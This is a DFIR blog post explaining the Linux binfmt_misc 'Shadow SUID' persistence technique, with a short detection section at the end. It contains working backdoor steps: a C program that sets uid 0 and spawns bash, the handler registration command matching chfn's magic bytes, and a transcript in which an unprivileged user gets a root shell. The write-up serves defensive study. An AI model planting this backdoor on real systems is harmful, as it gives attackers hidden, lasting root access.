---
title: Today I learned: binfmt_misc
url: https://dfir.ch/posts/today_i_learned_binfmt_misc/
source: Over Security - Cybersecurity news aggregator
date: 2025-10-30
fetch_date: 2025-10-31T03:14:32.411657
---

# Today I learned: binfmt_misc

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Today I learned: binfmt\_misc

30 Oct 2025

**Table of Contents**

* [Introduction](#introduction)
* [Why care?](#why-care)
* [Setting up our backdoor](#setting-up-our-backdoor)
* [Hunting](#hunting)
* [Let’s ask an expert](#lets-ask-an-expert)
* [Further reading](#further-reading)

## Introduction

`binfmt_misc` (short for Binary Format Miscellaneous) is a Linux kernel feature that allows the system to recognize and execute files based on custom binary formats. Itâs part of the Binary Format (`binfmt`) subsystem, which determines how the kernel runs an executable file.

Normally, Linux only knows how to run native binaries (like ELF files compiled for the systemâs CPU architecture, and a few other file types). `binfmt_misc` extends this by allowing other kinds of files, scripts, binaries for other architectures, or even custom file types, to be executed as if they were native.

When you enable `binfmt_misc`, the kernel adds a virtual filesystem (usually mounted at `/proc/sys/fs/binfmt_misc/`). Within this filesystem, you can register new binary format handlers. Each handler tells the kernel:

* How to recognize a file (e.g., by its magic bytes or filename extension)
* What interpreter or emulator to use to run it
* When a matching file is executed, the kernel automatically invokes the specified interpreter with the file as its argument.

`binfmt_misc` is managed from `/proc/sys/fs/binfmt_misc`. There are two files in that folder by default, `register` and `status`. To actually register a new binary type, you have to construct a string looking like

`:name:type:offset:magic:mask:interpreter:flags`

(where you can choose the : upon your needs) and echo it to `/proc/sys/fs/binfmt_misc/register`. The [binfmt-misc man page](https://docs.kernel.org/admin-guide/binfmt-misc.html) goes into details about the various flags.

## Why care?

**TL;DR**: `binfmt_misc` provides a nifty way (once the attacker has gained root rights on the machine) to create a little backdoor to regain root access when the original access no longer works. This mechanism is not really known, according to blog posts and articles on the topic, which makes it a perfect fit for staying under the radar.

In 2019, SentinelOne published a two-part analysis describing a persistence technique called **Shadow SUID** ([Part 1](https://www.sentinelone.com/blog/shadow-suid-for-privilege-persistence-part-1/), [Part 2](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/)):
*Shadow SUID is the same as a regular suid file, only it doesnât have the setuid bit, which makes it very hard to find or notice. The way shadow SUID works is by inheriting the setuid bit from an existing setuid binary using the binfmt\_misc mechanism, which is part of the Linux kernel.*

Interestingly, this technique seems to have fallen into oblivion again, as neither [MITRE ATT&CK](https://attack.mitre.org/matrices/enterprise/linux/) nor the five-part Elastic Security “Linux Persistence Detection Engineering” series mentioned it (the last part [here](https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence) with links to all other parts). As of 2025, however, the technique works wonderfully and would probably be very difficult to detect (see the hunting section later).

## Setting up our backdoor

A `binfmt_misc` rule is registered with the C (`credentials`) flag. That flag changes the normal behavior: instead of using the interpreterâs rights, the kernel looks up the access rights from the original file being executed. If that original file is setuid-root, the interpreter runs as root. (C also implies O, the “open fd for unreadable files” flag.)

In the demo from SentinelOne, they register a `binfmt_misc` rule that matches a chosen SUID binaryâs first 128 bytes (e.g., ping). Then, when you “run ping”, the kernel dispatches to the attackerâs interpreter but with pingâs setuid credentials, so the interpreter is effectively root. Thatâs why it looks like the “script” or binary (aka the interpreter) is being interpreted as SUID. Let that sink in.. It took me a few readings to grasp that concept. But it works, as we will see below!

First, we check if binfmt\_misc is mounted:

```
# mount | grep binfmt_misc
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
```

For setting up my interpreter, Iâm following 0xdfâs writeup for the HTB machine [Retired](https://0xdf.gitlab.io/2022/08/13/htb-retired.html#abuse-binfmt_misc) closely:

```
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 0;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

Compile the interpreter with `gcc -o malmoeb malmoeb.c`. Next, we need to find a suitable SUID binary:

```
root@binfmt_misc:/dev/shm# find / -perm -4000 2>/dev/null
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
[..]
```

Wait, `chfn`? The `chfn` binary on Linux is a legacy command-line tool used to change a user’s “finger” information. Details like their full name, office number, or phone numbers are stored in the GECOS field of `/etc/passwd`. Although rarely used today, it remains installed by default because itâs part of the standard `shadow` or `util-linux` package, which provides core user management utilities such as `passwd` and `chsh`. Keeping `chfn` ensures backward compatibility with older scripts and systems that still rely on traditional Unix account management tools, even though most modern environments no longer use the `finger` service or its associated data.

SentinelOne, in their demo, uses the ping utility, but that approach has the drawback of breaking the commandâs normal functionality. However, they also published some clever workarounds, though those are more complex. By using a legacy command like `chfn`, this extra step should most likely be unnecessary (since nobody hardly uses that command anymore).

Here we extract the magic bytes from `chfn` (in hex) to create a new handler.

```
cat /usr/bin/chfn | xxd -p | head -1 | sed 's/\(..\)/\\x\1/g'
\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x00\x72\x00\x00\x00\x00
```

We assemble the required string and `echo` this string (as root) into `/proc/sys/fs/binfmt_misc/register`:

```
echo ':malmoeb:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x00\x72\x00\x00\x00\x00::/dev/shm/malmoeb:C' > /proc/sys/fs/binfmt_misc/register
```

That breaks down to (again, thanks to 0xdf):

* name - malmoeb (arbitrary)
* using magic bytes
* no offset
* signature that matches the first 30 bytes of chfn
* no mask
* interpreter of /dev/shm/malmoeb
* C flag

`malmoeb` was successfully created as a new handler. Pointing to our interpreter:

```
root@binfmt_misc://proc/sys/fs/binfmt_misc# cat malmoeb
enabled
interpreter /dev/shm/malmoeb
flags: OC
offset 0
magic 7f454c4602010100000000000000000003003e0001000000007200000000
```

No, when we execute `chfn`..

```
malmoeb@binfmt_misc:~$ id
uid=1000(malmoeb) gid=1000(malmoeb) groups=1000(malmoeb)
malmoeb@binfmt_misc:~$ chfn
root@binfmt_misc:/home/malmoeb#
```

**Holy cow - this is really working!** As an unprivileged user, all I have to type is `chfn` to get a root shell!

## Hunting

The SUID searches (typically used for hunting) will not flag our interpreter binary, as we have not set SUID rights on this file. One technique would be to specifically check the registered handlers:

```
$ ls -la /proc/sys/fs/binfmt_misc
```

Or monitor `/proc/sys/fs/binfmt_misc/` for new or changed handlers; alert o...